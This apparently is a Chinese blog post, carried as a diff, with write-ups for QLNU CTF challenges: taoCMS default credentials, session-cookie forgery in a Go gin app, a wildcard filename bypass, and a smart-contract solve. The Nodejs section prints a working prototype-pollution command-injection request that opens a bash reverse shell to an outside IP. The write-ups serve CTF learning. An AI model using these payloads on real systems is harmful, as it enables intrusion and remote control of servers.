+          <a href="#Crypto" class="heading-link"><i class="fas fa-link"></i></a><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2>
+      
+        <h3 id="solve-me">
+          <a href="#solve-me" class="heading-link"><i class="fas fa-link"></i></a><a href="#solve-me" class="headerlink" title="solve_me"></a>solve_me</h3>
+      <p>先费马分解</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231007092105405.png" alt="image-20231007092105405"></p>
+<p>flag{fa2371c5-bf58-4502-9fea-caf12a85d1ff}</p>
+
+        <h2 id="web">
+          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a><a href="#web" class="headerlink" title="web"></a>web</h2>
+      
+        <h3 id="Easycms">
+          <a href="#Easycms" class="heading-link"><i class="fas fa-link"></i></a><a href="#Easycms" class="headerlink" title="Easycms"></a>Easycms</h3>
+      <p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008183430859.png"></p>
+<p>打开页面，页面显示taoCMS演示系统，想着应该有漏洞，上网搜taocms漏洞</p>
+<p>看到文章<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://blog.csdn.net/m0_46684679/article/details/129214411">http://blog.csdn.net/m0_46684679/article/details/129214411</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>访问url&#x2F;admin&#x2F;admin.php</p>
+<p>弹出一个登录界面，</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008183939747.png"></p>
+<blockquote>
+<p>账户admin</p>
+<p>密码tao</p>
+</blockquote>
+<p>登录成功，跳转到这个界面</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008184041682.png"></p>
+<p>点击文件管理，进入..&#x2F;..&#x2F;..&#x2F;看到flag，点开看到flag</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008184157673.png"></p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008184252536.png"></p>
+<p>QLNU{woW_CMs_1s_DAngeR0us_41rI9h7?_91b5e2b34cc2}</p>
+
+        <h3 id="Answered">
+          <a href="#Answered" class="heading-link"><i class="fas fa-link"></i></a><a href="#Answered" class="headerlink" title="Answered"></a>Answered</h3>
+      <p>附脚本</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">result = 1</span><br><span class="line">while True:</span><br><span class="line">    burp0_url = &quot;http://qlnuctf.shenghuo2.top:49194/&quot;</span><br><span class="line">    burp0_cookies = &#123;&quot;session&quot;: &quot;eyJzY29yZSI6MCwic3RhcnRfdGltZSI6MTY5NjY1NjY0OS43ODcwNTZ9.ZSDtCQ.0RE2Dez4_dd5v-o6Hk_rVi_UnpE&quot;&#125;</span><br><span class="line">    burp0_headers = &#123;&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.55&quot;,</span><br><span class="line">                     &quot;Origin&quot;: &quot;http://qlnuctf.shenghuo2.top:49194&quot;,</span><br><span class="line">                     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">                     &quot;Referer&quot;: &quot;http://qlnuctf.shenghuo2.top:49194/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">                     &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;</span><br><span class="line">    burp0_data = &#123;&quot;answer&quot;: result&#125;</span><br><span class="line">    res_2 = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line"></span><br><span class="line">    timu_2 = re.search(r&#x27;&lt;h3&gt;(.*?)&lt;/h3&gt;&#x27;, res_2.text)</span><br><span class="line">    if &#x27;异或&#x27; in timu_2.group(1):</span><br><span class="line">        pattern = r&#x27;题目：(\d+) 异或 (\d+) = ? &#x27;</span><br><span class="line">        match = re.search(pattern, res_2.text)</span><br><span class="line">        result = int(match.group(1)) ^ int(match.group(2))</span><br><span class="line">    elif &#x27;与&#x27; in timu_2.group(1):</span><br><span class="line">            pattern = r&#x27;题目：(\d+) 与 (\d+) = ? &#x27;</span><br><span class="line">            match = re.search(pattern, res_2.text)</span><br><span class="line">            result = int(match.group(1)) &amp; int(match.group(2))</span><br><span class="line">    else:</span><br><span class="line">            pattern = r&#x27;题目：(\d+) (.) (\d+) = ? &#x27;</span><br><span class="line">            match = re.search(pattern, res_2.text)</span><br><span class="line">            group_1 = int(match.group(1))</span><br><span class="line">            group_3 = int(match.group(3))</span><br><span class="line">    if match.group(2) == &#x27;+&#x27;:</span><br><span class="line">        result = group_1 + group_3</span><br><span class="line">    elif match.group(2) == &#x27;-&#x27;:</span><br><span class="line">        result = group_1 - group_3</span><br><span class="line">    elif match.group(2) == &#x27;x&#x27;:</span><br><span class="line">        result = group_1 * group_3</span><br><span class="line">    elif match.group(2) == &#x27;÷&#x27;:</span><br><span class="line">        result = group_1 // group_3</span><br><span class="line">    if &quot;flag&quot; in res_2.text:</span><br><span class="line">        print(res_2.text)</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231007144755630.png"></p>
+<p>小tips：有一点难的是就是，发的包需要是完整的，加上session（最主要的），之前没有完整的数据包，搞了半天不行。。。</p>
+
+        <h3 id="EasyGo">
+          <a href="#EasyGo" class="heading-link"><i class="fas fa-link"></i></a><a href="#EasyGo" class="headerlink" title="EasyGo"></a>EasyGo</h3>
+      <p>下载附件，是用go的<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://so.csdn.net/so/search?q=gin%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">gin框架</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>写的后端，cookie-session是由<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://github.com/gorilla/sessions">gorilla&#x2F;sessions</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>来实现，而sessions库使用了另一个库：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://github.com/gorilla/securecookie">gorilla&#x2F;securecookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>来实现对cookie的安全传输。</p>
+<p>查看源码，发现主要部分在route.go部分，需要admin才有权限查看文件得到flag</p>
+<p>总共有两个路由，一个“&#x2F;“路由，一个”&#x2F;readflag”路由</p>
+<p>根路由 &#x2F;</p>
+<figure class="highlight go"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/readflag&quot;</span>, route.Readflag)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:8000&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>最主要的一部分</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))</span><br><span class="line"></span><br><span class="line">func Index(c *gin.Context) &#123;</span><br><span class="line">	session, err := store.Get(c.Request, &quot;session-name&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	if session.Values[&quot;name&quot;] == nil &#123;</span><br><span class="line">		session.Values[&quot;name&quot;] = &quot;User&quot;</span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(200, &quot;Hello, User. How to become admin?&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>可以看到，这里将判断是否携带了cookie，如果cookie中的name为空，就将其设置为user。并且有一个细节，无论是否是管理员，根路由永远都会返回Hello, User. How to become admin?</p>
+<p>想到需要伪造session</p>
+<p>上面通过获取环境变量中的SESSION_KEY来获取生成securecookie。只能对SESSION_KEY进行猜测，猜测并未设置SESSION_KEY。在本地运行程序，将SESSION_KEY置为空从而伪造cookie。</p>
+<p>这里将route.go修改一下</p>
+<figure class="highlight go"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, User. How to become admin?&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>之后在附件目录</p>
+<p>命令行go run main.go</p>
+<p>之后访问127.0.0.1:8000获取session</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008185921131.png"></p>
+<p>得到session</p>
+<blockquote>
+<p>MTY5NjY1NDM2M3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXx83HZpaT0T7b2lYtEd0cAmvQ_sS926v-ycwnspOHOOGw&#x3D;&#x3D;</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008190015859.png"></p>
+<p>这里呼应前面修改之后他不跳转，一直显示Hello, User. How to become admin?，修改之后需要访问url&#x2F;readflag才能看到回显</p>
+<p>访问url&#x2F;readflag可以看到出现了你已经是admin，怎么获得flag</p>
+<figure class="highlight go"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		c.String(<span class="number">200</span>, <span class="string">&quot;Congratulation! You are admin,But how to get flag?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">		path := c.Query(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">	</span><br><span class="line">		reg := regexp.MustCompile(<span class="string">`[b-zA-Z_@#%^&amp;*:&#123;|&#125;+&lt;&gt;&quot;;\[\]]`</span>)</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> reg.MatchString(path) &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;nonono&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>读源码看到需要filename读文件，过滤了好多字符，没过滤？通配符读flag就好</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231007151052327.png"></p>
+
+        <h3 id="Nodejs">
+          <a href="#Nodejs" class="heading-link"><i class="fas fa-link"></i></a><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h3>
+      <p>这个题基本上原题了。。。。原题是贵阳大数据及网络安全精英对抗赛的JUST_PROTO</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://cloud.tencent.com/developer/article/2282627">http://cloud.tencent.com/developer/article/2282627</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>下载附件直接看源码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const &#123; exec &#125; = require(&quot;child_process&quot;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; </span><br><span class="line">    res.send(&#x27;谁说JavaScript不算Java&#x27;));</span><br><span class="line"></span><br><span class="line">let gift = &#123;</span><br><span class="line">    s1: (token)=&gt;&#123; </span><br><span class="line">        return !!token </span><br><span class="line">    &#125;,</span><br><span class="line">    sl: ()=&gt;&#123; </span><br><span class="line">        if (</span><br><span class="line">            JSON.stringify(si).length &gt; 8000) </span><br><span class="line">            si = &#123;&#125; </span><br><span class="line">        &#125;, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let si = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/set&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    gift.sl(); </span><br><span class="line">    const &#123;token, key, val&#125; = req.query;</span><br><span class="line">    if (!gift.s1(token) || !val) return res.send(&quot;what?&quot;); </span><br><span class="line">    si[token][key] = val; </span><br><span class="line">    res.json(&#123; is_succ: true &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/get&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    const &#123;token, key&#125; = req.query;</span><br><span class="line">    if (!gift.s1(token)) return res.send(&quot;what?&quot;);</span><br><span class="line">    let result = si[token];</span><br><span class="line">    if (result) result = result[key];</span><br><span class="line">    res.json(&#123; result: result === undefined ? &quot;null&quot; : result, is_succ: result !== undefined &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.put(&#x27;/up&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    let date_stream = Buffer.from(JSON.stringify(si)); </span><br><span class="line">    const cmd = gift.redis_set + `date $&#123;date_stream.toString(&#x27;base64&#x27;)&#125;`;</span><br><span class="line">    exec(cmd, (err,_,__) =&gt; &#123;</span><br><span class="line">        if (err) return res.json(&#123; is_succ: false &#125;);</span><br><span class="line">        res.json(&#123; is_succ: true &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(8080, () =&gt; console.log(`谁说JavaScript不算Java`));</span><br></pre></td></tr></table></div></figure>
+
+<p>原型链污染，其中的exec存在命令拼接</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    &quot;http://k2p.shenghuo2.top:40046/set?token=__proto__&amp;key=redis_set&amp;val=bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.57.236.154%2F9999%200%3E%261&#x27;;&quot;).text)</span><br><span class="line">requests.put(f&quot;http://k2p.shenghuo2.top:40046/up&quot;)</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008191215353.png"></p>
+
+        <h2 id="Blockchain">
+          <a href="#Blockchain" class="heading-link"><i class="fas fa-link"></i></a><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2>
+      <p>准备工作 nc工具  MetaMask  <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://remix.ethereum.org/">remix网站</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>本题借鉴文章<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://coldwinds5167.github.io/2022/10/Blockchain-solve/">http://coldwinds5167.github.io/2022/10/Blockchain-solve/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>先利用题目给了水龙头，创建一个账户</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008194559328.png" alt="image-20231008194559328"></p>
+<p>根据要求，发多于0.01个测试币注册账号</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008194648446.png" alt="image-20231008194648446"></p>
+<p>之后访问2（需要手动推出nc重新链接）</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008194728150.png" alt="image-20231008194728150"></p>
+<p>提取他给的contrant address</p>
+<p> 0x002C8040CC431dCd9440B966E5A3f63B9ab61F56</p>
+<p>在这之前你需要利用题目给的水龙头和rcp创建钱包账户</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008195942763.png" alt="image-20231008195942763"></p>
+<p>选中网络</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008200011224.png" alt="image-20231008200011224"></p>
+<p>之后点添加网络-手动添加网络</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008200126241.png" alt="image-20231008200126241"></p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008200158766.png" alt="image-20231008200158766"></p>
+<p>之后复制你钱包地址<img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008200232881.png" alt="image-20231008200232881"></p>
+<p>放到给的水龙头地址</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008200323977.png" alt="image-20231008200323977"></p>
+<p>之后你的账户里就有钱了</p>
+<p>之后访问4，得到合约</p>
+<p>pragma solidity 0.8.9;</p>
+<p>contract Greeter {<br>    string greeting;</p>
+<pre><code>constructor(string memory _greeting) &#123;
+    greeting = _greeting;
+&#125;
+
+function greet() public view returns (string memory) &#123;
+    return greeting;
+&#125;
+
+function setGreeting(string memory _greeting) public &#123;
+    greeting = _greeting;
+&#125;
+
+function isSolved() public view returns (bool) &#123;
+    string memory ctf = &quot;YouAreTheFutur3ofQLNU&quot;;
+    return keccak256(abi.encodePacked(ctf)) == keccak256(abi.encodePacked(greeting));
+&#125;&#125;
+</code></pre>
+<p>我们这里用到remix</p>
+<p>exp</p>
+<figure class="highlight go"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line">contract Greeter &#123;</span><br><span class="line">    <span class="type">string</span> greeting;</span><br><span class="line"></span><br><span class="line">    constructor(<span class="type">string</span> memory _greeting) &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (<span class="type">string</span> memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(<span class="type">string</span> memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (<span class="type">bool</span>) &#123;</span><br><span class="line">        <span class="type">string</span> memory ctf = <span class="string">&quot;YouAreTheFutur3ofQLNU&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(ctf)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    address transcation=<span class="number">0xbaed0e840640c1d979ACed1315e14D983808F9F5</span>;<span class="comment">//这里的0x啥对应的是我们前面提取的钱包地址</span></span><br><span class="line">    Greeter target=Greeter(transcation);</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    function hack() public returns(<span class="type">bool</span>)&#123;</span><br><span class="line">        <span class="type">bool</span> ans=<span class="literal">false</span>;</span><br><span class="line">        <span class="type">string</span> memory greeting=<span class="string">&quot;YouAreTheFutur3ofQLNU&quot;</span>;</span><br><span class="line">        target.setGreeting(greeting);</span><br><span class="line">        ans=target.isSolved();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008195429292.png" alt="image-20231008195429292"></p>
+<p>红色的地方要对应起来</p>
+<p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008195603850.png" alt="image-20231008195603850"></p>
+<p>先对应第一步，先inject的那个，第二步deploy，之后小狐狸钱包（MetaMask）会弹窗让你确认，等到下面出现绿色对号就可，第三步hack，小狐狸钱包发钱，成功后，回去访问4就可以了</p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Qingchuan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
